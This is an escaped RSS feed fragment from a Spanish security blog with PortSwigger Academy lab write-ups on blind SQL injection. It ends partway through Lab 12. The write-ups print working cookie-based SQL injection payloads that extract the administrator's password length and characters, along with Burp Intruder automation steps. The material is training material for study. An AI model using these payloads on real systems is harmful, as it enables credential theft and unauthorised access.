			flex-basis: 485px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/resuelto.png&#34; data-size=&#34;1797x888&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/resuelto.png&#34;
			width=&#34;1797&#34;
			height=&#34;888&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/resuelto_hu255c4e95acf6dc1716e44febf60b0d46_100921_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/resuelto_hu255c4e95acf6dc1716e44febf60b0d46_100921_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 11</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/</link>
        <pubDate>Sun, 07 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 11" /&gt;&lt;h1 id=&#34;lab-blind-sql-injection-with-conditional-responses&#34;&gt;Lab: Blind SQL injection with conditional responses&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder extraer la contrasena del usuario &lt;code&gt;administrator&lt;/code&gt;, para eso se nos dan las columnas &lt;code&gt;username&lt;/code&gt; y &lt;code&gt;password&lt;/code&gt; de la tabla &lt;code&gt;users&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Lo primero es buscar donde es vulnerable a sql injection, en este caso nos dicen en el articulo que seguramente es la cookie de &lt;code&gt;TrackingId&lt;/code&gt; solo queda comprobarlo.&lt;/p&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;h4 id=&#34;detectar-si-es-vulnerable&#34;&gt;Detectar si es vulnerable&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;TrackingId=xxxxxxxxxxxxxxxx&#39; and &#39;1&#39;=&#39;1; //Muestra welcome back
TrackingId=xxxxxxxxxxxxxxxx&#39; and &#39;1&#39;=&#39;2; //No muestra welcome back
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 272; 
			flex-basis: 653px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/cookie.png&#34; data-size=&#34;1533x563&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/cookie.png&#34;
			width=&#34;1533&#34;
			height=&#34;563&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/cookie_hu160d6ae4632b30fd2dacbfe9b3d0c119_96300_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/cookie_hu160d6ae4632b30fd2dacbfe9b3d0c119_96300_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Peticion enviada al servidor&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Peticion enviada al servidor&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Al inyectar la solicitud podemos darnos cuenta que el sistema valida la cookie dependiendo de la respuesta de mysql, si hacemos una comparacion que no es correcta, el sistema ya no imprime &lt;code&gt;welcome back&lt;/code&gt;.&lt;/p&gt;
&lt;h4 id=&#34;verificar-tamano-de-la-contrasena-de-administrator&#34;&gt;Verificar tamano de la contrasena de administrator&lt;/h4&gt;
&lt;p&gt;Ahora toca construir una consulta para inyectar para poder extraer los datos de base de datos de &lt;code&gt;users&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;TrackingId&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xxxxxxxxxxxxxxxx&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and (select length(password) from users where username=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;administrator&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;)=1--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;La siguiente solicitud lo que hace es hacer un select del tamano de la contrasena del usuario &lt;code&gt;administrator&lt;/code&gt; y el valor numerico es el que ira cambiando, y hasta que el sistema devuelva la respuesta &lt;code&gt;welcome back&lt;/code&gt; es porque es lo correcto, todo basandose en que la respuesta sea true si imprimira ese resultado.&lt;/p&gt;
&lt;p&gt;En este caso construimos la siguiente captura para saber el valor del tamano de la contrasena para posteriormente ir cambiando el valor de la consulta y hacer un ataque con intruder en burpsuite para evitar hacerlo a mano y durar mucho en el proceso. Para eso crafteamos la siguiente solicitud, y agregamos como payload el valor numerico para ir cambiandolo y averiguar el tamano de la contrasena administrador.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 218; 
			flex-basis: 524px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intruderpayload.png&#34; data-size=&#34;1129x517&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intruderpayload.png&#34;
			width=&#34;1129&#34;
			height=&#34;517&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intruderpayload_hue30736de10eb95c71aec17cad9a24a21_67662_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intruderpayload_hue30736de10eb95c71aec17cad9a24a21_67662_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Solicitud que se enviara&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Solicitud que se enviara&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Luego agregaremos el payload para que acepte numeros e ir probando uno por uno para posteriormente analizar el resultado. El&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 107; 
			flex-basis: 257px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intrudernumero.png&#34; data-size=&#34;679x633&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intrudernumero.png&#34;
			width=&#34;679&#34;
			height=&#34;633&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intrudernumero_hu80b5d77c54ae8ac1832cc712103eb1d5_23225_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intrudernumero_hu80b5d77c54ae8ac1832cc712103eb1d5_23225_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Payloads con valores numericos&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Payloads con valores numericos&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y finalmente haremos un grep en la respuesta ya que si recibimos la palabra &lt;code&gt;welcome back&lt;/code&gt; es porque ese es el tamano de la contrasena. Si&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 91; 
			flex-basis: 220px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intrudergrep.png&#34; data-size=&#34;582x634&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intrudergrep.png&#34;
			width=&#34;582&#34;
			height=&#34;634&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intrudergrep_hu9ac373880bb471e69b435a9f66b71f59_23449_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intrudergrep_hu9ac373880bb471e69b435a9f66b71f59_23449_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Grep de la respuesta recibida&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Grep de la respuesta recibida&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y ejecutando el ataque podemos ver que la contrasena tiene un tamano de 20.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 226; 
			flex-basis: 542px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intruderataque.png&#34; data-size=&#34;638x282&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intruderataque.png&#34;
			width=&#34;638&#34;
			height=&#34;282&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intruderataque_hu4752a7340756880c225e42211dfa93af_11255_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/intruderataque_hu4752a7340756880c225e42211dfa93af_11255_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Ataque realizado&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Ataque realizado&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;tomar-los-datos-del-usuario-administrator&#34;&gt;Tomar los datos del usuario administrator&lt;/h4&gt;
&lt;p&gt;Sabiendo ya el tamano ya podemos proceder a tomar la contrasena del usuario administrator, para eso inyectaremos la siguiente solicitud:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;TrackingId&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xxxxxxxxxxxxxxxx&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and (select substr(password,1,1) from users where username=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;administrator&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;)=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;SUBSTR: Son 3 valores los que espera que serian&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Variable: Puede ser nombre de tabla, string, nombre de columna&lt;/li&gt;
&lt;li&gt;Segundo valor: A este se le indica desde donde quiere que se empiece a tomar en cuenta, &lt;code&gt;este es el que ira cambiando&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Tercero: Cuantos valores quiere que se imprima, en este caso &lt;code&gt;solo queremos 1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;Para el uso de texto enviaremos peticiones con valores del abecedario y valores numericos, para eso es mejor utilizar la siguiente &lt;!-- raw HTML omitted --&gt;lista de caracteres alfanumericos&lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;Y ahora vamos a intruder y configuramos de la siguiente manera, de forma de cluster bomb para enviar 2 parametros y que pruebe todas las combinaciones.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;NOTA: En las capturas se muestra el valor alfanumerico sin comillas simples, por lo cual se debe de colocar&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 342; 
			flex-basis: 822px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterbomb.png&#34; data-size=&#34;1576x460&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterbomb.png&#34;
			width=&#34;1576&#34;
			height=&#34;460&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterbomb_hua655820cd74765bac212c73336190a65_67102_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterbomb_hua655820cd74765bac212c73336190a65_67102_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Configuracion de posicion&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Configuracion de posicion&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora a configurar los payloads tanto del valor 1 como del 2:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 113; 
			flex-basis: 273px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterbombpayload1.png&#34; data-size=&#34;692x608&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterbombpayload1.png&#34;
			width=&#34;692&#34;
			height=&#34;608&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterbombpayload1_hu2babaf2b0848eebc433521a7ad660fff_22272_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterbombpayload1_hu2babaf2b0848eebc433521a7ad660fff_22272_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Configuracion de payload 1&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Configuracion de payload 1&lt;/figcaption&gt;
	
&lt;/figure&gt;
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 145; 
			flex-basis: 350px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterbombpayload2.png&#34; data-size=&#34;706x484&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterbombpayload2.png&#34;
			width=&#34;706&#34;
			height=&#34;484&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterbombpayload2_hu52f56d3113064eaca38d0bc564f3a569_18807_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterbombpayload2_hu52f56d3113064eaca38d0bc564f3a569_18807_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Configuracion de payload 2&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Configuracion de payload 2&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y en este caso ya hemos obtenido los resultados, solamente queda unirlos para entrar como el usuario &lt;code&gt;administrator&lt;/code&gt; que quedaria con el password &lt;code&gt;inpxkyrid4icz30lq1v8&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 300; 
			flex-basis: 721px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterataque.png&#34; data-size=&#34;842x280&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterataque.png&#34;
			width=&#34;842&#34;
			height=&#34;280&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterataque_hu05fbb61956efdbb8c27f281e91ac76ce_16719_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/clusterataque_hu05fbb61956efdbb8c27f281e91ac76ce_16719_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Ataque con cluster bomb&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Ataque con cluster bomb&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con esto hemos resulto el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 274; 
			flex-basis: 658px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/resuelto.png&#34; data-size=&#34;1699x619&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/resuelto.png&#34;
			width=&#34;1699&#34;
			height=&#34;619&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/resuelto_hu2f090387252526eb72ea54d57dfdca59_56387_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/resuelto_hu2f090387252526eb72ea54d57dfdca59_56387_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id=&#34;fn:2&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/alphanum-case.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Caracteres alfanumericos&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:2&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 12</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/</link>
        <pubDate>Sat, 06 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 12" /&gt;&lt;h1 id=&#34;-lab-blind-sql-injection-with-conditional-errors&#34;&gt;# Lab: Blind SQL injection with conditional errors&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder extraer la contrasena de la tabla &lt;code&gt;users&lt;/code&gt; del usuario &lt;code&gt;administrator&lt;/code&gt;. Ademas se indica que esta utilizando en el backend Oracle por lo cual procederemos a buscar la informacion sobre este.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Al abrir la aplicacion vemos que ya no se comporta como en el Lab11 lo que nos permitia que segun la respuesta devuelta por el servidor saber si la consulta que realizabamos era true o false.&lt;/p&gt;
&lt;p&gt;Ahora lo que se puede hacer es inyectar una consulta SQL que nos genere ese error a proposito para saber si la consulta es true o false y el error terminara dando un error en el servidor y nos guiaremos por eso. Y ya que sabemos que es un backend Oracle haremos la siguiente prueba a inyectar en la cookie&lt;/p&gt;
&lt;p&gt;En este caso inyectaremos la siguiente peticion:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;xxxxx&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; AND (SELECT CASE WHEN (1=2) THEN to_char(1/0) ELSE &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; END FROM dual)=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;	&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;muestra&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;la&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pagina&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;normal&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xxxxx&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; AND (SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; END FROM dual)=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;muestra&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;un&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;de&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;servidor&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Lo que hace practicamente es que se cumpla la condicion de la cookie y luego la dentro del select genera un propio error que nos dira si es true o false segun la condicion que queramos, en este caso de prueba se valida con &lt;code&gt;1=1&lt;/code&gt; o &lt;code&gt;1=2&lt;/code&gt; aqui genera error del servidor solo si se cumple como pasa con la condicion &lt;code&gt;1=1&lt;/code&gt;, practicamente es un codigo que en cualquier lenguaje de programacion se ve, por ultimo si la condicion no es correcta como la salida sera &lt;code&gt;&#39;a&#39;&lt;/code&gt; solo valida que sea igual a la ultima a ingresada &lt;code&gt;&#39;a&lt;/code&gt; con una sola comilla al inicio para que la ultima la agregue el propio sistema a la que le colocaria a la cookie.&lt;/p&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;h4 id=&#34;recuperar-tamano-de-contrasena&#34;&gt;Recuperar tamano de contrasena&lt;/h4&gt;
&lt;p&gt;Como en el laboratorio anterior tocara saber el tamano de la contrasena y para eso utilizaremos la siguiente consulta inyectada:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;xxxxx&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; AND (SELECT CASE WHEN ((select length(password) from users where username=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;administrator&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;)=§20§) THEN to_char(1/0) ELSE &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; END FROM dual)=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Esta inyeccion hace validar el tamano de la contrasena, si la contrasena tiene el tamano que se le indica hara que la aplicacion genere un error &lt;code&gt;500&lt;/code&gt; en el servidor de &lt;code&gt;Internal Server Error&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 214; 
			flex-basis: 515px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/positions.png&#34; data-size=&#34;1136x529&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/positions.png&#34;
			width=&#34;1136&#34;
			height=&#34;529&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/positions_hu8ffc86b7f7277a11e0ab0ae97ff0a112_74882_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/positions_hu8ffc86b7f7277a11e0ab0ae97ff0a112_74882_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Payload a enviar el ataque por intruder&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Payload a enviar el ataque por intruder&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Al valor se le hara una peticion de 1 hasta 30 para saber cual es el tamano de la contrasena y como se muestra la aplicacion genera un error &lt;code&gt;500&lt;/code&gt; con el payload 20 lo que significa que la contrasena tiene 20 caracteres.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 282; 
			flex-basis: 676px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/payloads.png&#34; data-size=&#34;784x278&#34;&gt;
